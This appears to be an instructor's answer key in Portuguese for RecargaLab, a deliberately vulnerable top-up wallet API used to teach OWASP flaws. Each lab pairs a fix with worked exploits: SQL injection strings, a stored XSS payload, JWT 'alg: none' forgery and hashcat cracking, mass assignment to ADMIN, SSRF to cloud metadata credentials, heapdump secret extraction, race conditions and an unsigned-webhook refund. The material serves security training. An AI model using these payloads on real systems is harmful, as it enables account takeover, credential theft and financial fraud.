# Gabarito do instrutor · RecargaLab

> Material para o instrutor. Não distribua aos participantes antes do bloco prático.

Convenções: `TOKEN_ALICE` é o token obtido no login da alice; a API responde em `http://localhost:8081`.

```bash
TOKEN_ALICE=$(curl -s localhost:8081/api/v1/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"alice@lab.local","senha":"Alice#Lab1"}' | sed 's/.*"token":"\([^"]*\)".*/\1/')
```

---

## Lab 1 · IDOR no extrato · A01:2025 (A01:2021) · API1:2023 · CWE-639

**Exploração:** com o token da alice, `GET /api/v1/wallets/1002/statement` devolve o extrato do bob (inclui a transação 88231, PIX de R$ 350,00). No Intruder, variar o ID de 1000 a 1006 revela todas as carteiras; IDs inexistentes devolvem `[]`.

**Onde está:** `web/WalletController.java`, método `statement`.

**Correção:** buscar a carteira por `id` **e** `owner_id` do usuário autenticado e responder 404 quando não pertencer a ele. Teste automatizado com dois usuários.

**Extra:** `POST /api/v1/recargas` debita a carteira do `userId` enviado no corpo, não do usuário logado: a alice consegue debitar o saldo do bob.

## Lab 2 · SQL Injection · A05:2025 (A03:2021) · CWE-89

**Exploração:**
- `operadora=Vivo'` → 500 com `PSQLException: unterminated quoted string` e stack trace (também é A10:2025).
- `operadora=Vivo' OR '1'='1` (URL-encoded: `Vivo'+OR+'1'='1`) → devolve recargas de **todos** os usuários (campo `usuario`).
- Exploração por UNION é possível (8 colunas); deixe como desafio para quem terminar antes.

**Onde está:** `web/RecargaController.java`, método `busca`. A mesma linha também tem log injection (A09).

**Correção:** `jdbcTemplate.query("... WHERE r.user_id = ? AND r.operadora = ?", mapper, userId, operadora)`; usuário de banco sem permissões de DDL.

## Lab 3 · XSS armazenado · A05:2025 (A03:2021) · CWE-79

**Exploração:**
```http
PUT /api/v1/contatos/77
Authorization: Bearer TOKEN_ALICE
Content-Type: application/json

{"apelido":"<img src=x onerror=alert(document.domain)>","telefone":"+5511999990000"}
```
Abrir `http://localhost:8081/contatos`. Discussão: o token está em `localStorage` **e** num cookie sem `HttpOnly`; um script injetado lê os dois.

**Onde está:** `resources/templates/contatos.html` (`th:utext`) e `web/AuthController.java` (cookie sem `HttpOnly`).

**Correção:** `th:text`, validação de formato do apelido, CSP restritiva, cookie `HttpOnly; Secure; SameSite`, e token fora do `localStorage`.

## Lab 4 · Lógica de negócio e race condition · A06:2025 (A04:2021) · API6:2023 · CWE-602, CWE-362

**Valor adulterado:** interceptar a compra e trocar `"valor":30` por `"valor":0.01` (ou `"desconto":29.99`). Resposta `201` com `"debitado":0.01`. Com `valor` negativo, a carteira é **creditada**.

**Race condition:** enviar `POST /api/v1/cashback/resgatar {"codigo":"BEMVINDO-ALICE"}` ao Repeater, duplicar em 10 abas, agrupar e usar *Send group in parallel*. O endpoint espera 300 ms entre a verificação e a marcação de uso; vários resgates passam e o saldo sobe R$ 10 por request bem-sucedido.

**Onde está:** `web/RecargaController.java` (`recarregar`) e `web/CashbackController.java` (`resgatar`).

**Correção:** preço do catálogo no servidor, carteira do usuário autenticado, `Idempotency-Key`, transação com `SELECT ... FOR UPDATE` (ou `UPDATE cupons SET usado = TRUE WHERE codigo = ? AND usado = FALSE` checando linhas afetadas).

## Lab 5 · Mass assignment · A01:2025 (A01:2021) · API3:2023 · CWE-915

**Exploração:**
```http
PUT /api/v1/users/me
Authorization: Bearer TOKEN_ALICE
Content-Type: application/json

{"nome":"Alice","role":"ADMIN","cashbackPercent":50}
```
Depois, `GET /api/admin/usuarios` com o mesmo token devolve todos os usuários, com hash MD5 de senha (A04:2025). O `GET /users/me` original já expunha `role`, `passwordHash` e `kycStatus` (API3:2023).

**Onde está:** `web/UserController.java` (`atualizar` recebe a entidade `User`).

**Correção:** record de entrada só com `nome` e `telefone`, DTO de saída sem atributos internos, mudança de papel apenas por fluxo administrativo auditado.

## Lab 6 · JWT fraco · A07:2025 + A04:2025 (A07:2021) · CWE-347, CWE-798

**Teste 1 · `alg: none`:** no JWT Editor, alterar `sub` para `bob` e aplicar *Attack › "none" Signing Algorithm*. A API aceita o token sem assinatura. `GET /api/v1/users/me` devolve `bob@lab.local`.

**Teste 2 · segredo fraco:**
```bash
echo "$TOKEN_ALICE" > token.txt
hashcat -a 0 -m 16500 token.txt wordlists/jwt-secrets.txt   # segredo: secret123
```
No JWT Editor, criar *New Symmetric Key* com `k` = Base64URL de `secret123`, alterar `sub` e assinar.

**Onde está:** `security/JwtService.java` e `JWT_SECRET` no `docker-compose.yml`. Também: login sem rate limit e sem MFA (`web/AuthController.java`).

**Correção:** `spring-boot-starter-oauth2-resource-server` com chave assimétrica do IdP, validação de `iss`/`aud`/`exp`, tokens de 5 a 15 minutos, papel lido do servidor, rate limit e MFA no login.

## Lab 7 · SSRF · A01:2025 (A10:2021) · API7:2023 · CWE-918

**Exploração** (form-urlencoded):
- `url=http://127.0.0.1:8080/actuator/env` → variáveis internas.
- `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` → `app`.
- `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app` → credencial fictícia `LAB-FAKE-KEY`.
- `url=http://postgres:5432/` → erro diferente de host inexistente: dá para mapear a rede interna pelas mensagens.

**Onde está:** `web/ReceiptController.java`.

**Correção:** allowlist de esquema e host, resolução de DNS e bloqueio de faixas privadas/link-local, sem redirects, timeout curto; na nuvem, IMDSv2 e egress restrito.

## Lab 8 · Actuator e erros verbosos · A02:2025 + A10:2025 (A05:2021) · CWE-215, CWE-209

**Exploração:**
- `GET /actuator` lista `env`, `heapdump`, `configprops`, `mappings`, `loggers`.
- `GET /actuator/env` mostra `DB_PASSWORD`, `JWT_SECRET` e `OPERADORA_API_KEY` em claro.
- `GET /actuator/heapdump` → `strings heapdump | grep -E 'Recarga@2024|secret123|sk_live_lab|Bearer'`.
- `POST /api/v1/recargas` com corpo `{"produtoId":` → stack trace com pacotes e versões.
- `POST /actuator/loggers/br.com.wiser.recargalab` com `{"configuredLevel":"DEBUG"}` altera log em produção sem autenticação.

**Onde está:** `resources/application.properties` e `web/GlobalErrorHandler.java`.

**Correção:** expor só `health,info`, porta de gestão interna, `include-stacktrace=never`, handler com `ProblemDetail` e referência de erro.

## Bônus · SCA · A03:2025 (A06:2021) · CWE-1395

O `pom.xml` declara `commons-text 1.9` (CVE-2022-42889) e `commons-collections 3.2.1` (gadget de desserialização, CVE-2015-7501). Nenhuma é alcançável com entrada do usuário: bom ponto para discutir que **alcançabilidade** muda a prioridade em relação ao CVSS bruto.

## Transversais

- **A08:2025 · webhook sem assinatura:** `curl -X POST localhost:8081/webhooks/operadora -H 'Content-Type: application/json' -d '{"recargaId":5001,"status":"ESTORNADA"}'` devolve à carteira o valor de uma recarga já entregue (use o `recargaId` retornado no Lab 4; as recargas criadas na sessão começam em 5001). Correção: HMAC com timestamp e comparação em tempo constante (slide A08).
- **A09:2025 · logs:** `docker compose logs recargalab | grep login` mostra senha e token em claro; nenhum dos ataques gerou alerta; o parâmetro de busca permite forjar linhas de log (CR/LF).
- **A04:2025 · senhas em MD5 sem salt:** hashes visíveis no Lab 5 são revertidos com wordlist em segundos.
